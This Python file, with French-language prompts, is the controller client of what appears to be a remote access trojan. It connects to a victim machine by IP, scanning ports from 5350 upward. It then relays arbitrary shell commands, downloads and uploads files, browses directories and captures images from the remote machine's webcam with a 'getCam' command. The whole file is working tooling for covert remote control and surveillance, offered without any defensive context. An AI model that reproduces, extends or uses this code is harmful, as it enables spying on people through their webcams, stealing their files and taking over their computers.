#CLIENT
import os
import socket
from time import sleep as sl
from time import time

buf=2048
listeCommande=["cls","close","getDos","getFile [fichier]","sendFile [name destination]","change [dossier]","changeToParent","getDir","getCam","help"]
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cont=True

def sendFile(path):
	if os.path.exists(path):
		fichierImage = open(path, "rb")
		tailleImage = str(os.path.getsize(path))
		for i in range(8-len(tailleImage)):
		    tailleImage = "0"+ tailleImage	 
		try:
			socket.send(tailleImage.encode())
		except ConnectionResetError:
				print("Connection fermer")
		try:
			socket.send(fichierImage.read())
		except ConnectionResetError:
			print("Connection fermer")
	else:
		socket.send(b"none")

def receiveFile(name):
	end=time()+120
	now=time()
	while True:
		tailleImage=socket.recv(8).decode()
		if tailleImage!='':
			break
	if tailleImage!="none":
		size = int(tailleImage)
		contenuTelecharge = 0
		with open(name,"wb") as fichierImage:
			while contenuTelecharge < size and now<end:
				now=time()
				contenuRecu = socket.recv(1024)
				fichierImage.write(contenuRecu)
				contenuTelecharge += len(contenuRecu)
		if(now>end):
				print("La commande a échoué, retour trop lent de la machine")
	else:
		print("Erreur lors de la prise de photo")

def newName(name,extension):
	name=str(name)
	tempName=name
	num=1
	while os.path.exists(name+extension):
		name=tempName+str(num)
		num+=1
	return name+extension


while True:
	try:
		hote=input("Ip: ")
		if(hote.find("close")!=-1):
			cont=False
			break
		now=time()
		end=time()+120
		port=5350
		while now<end:
			try:
				socket.connect((hote, port))
				break
			except:
				port+=1

			print("Connection on {}".format(port))
		test=socket.recv(buf)
		if test!=b"good":
			print("Port {} ouvert".format(port))
			raise ValueError("erreur")   
		break
	except:
		print("Mauvaise machine, réessayer, la machine est peut-être éteinte")
wait=False


while cont:
	commande=input("\n> ")
	if (commande=="cls"):
		os.system("cls")
	elif(commande=="close"):
		socket.send(b"close")
		print("Console va fermer")
		break
	elif(commande=="getCam"):
		socket.send(b"getCam")
		imageName=newName("webCam",".jpg")
		receiveFile(imageName)
	elif(commande.startswith("getFile")):
		socket.send(commande.encode())
		name=input("\nname> ")
		extension=input("\nextention>")
		if not extension.startswith("."):
			extension="."+extension
		name=newName(name,extension)
		receiveFile(name)
	elif(commande.startswith("sendFile")):
		socket.send(commande.encode("utf-8"))
		file=input("file> ")
		sendFile(file)
	elif(commande=="help"):
		print("Commande présent:")
		for i in listeCommande:
			print("    - "+i)
	else:
		socket.send(commande.encode('utf-8'))
		print(commande+" envoyé à "+str(hote)+":"+str(port))
		wait=True
	sl(1)
	if wait:
		end=time()+60
		now=time()
		while now<end:
			now=time()
			reponse=socket.recv(buf).decode("utf-8")
			if(reponse!=""):
				if(reponse!="none"):
					print(reponse)
				break
		if(now>end):
			print("La commande a échoué, aucun retour de la machine")
	wait=False

socket.close()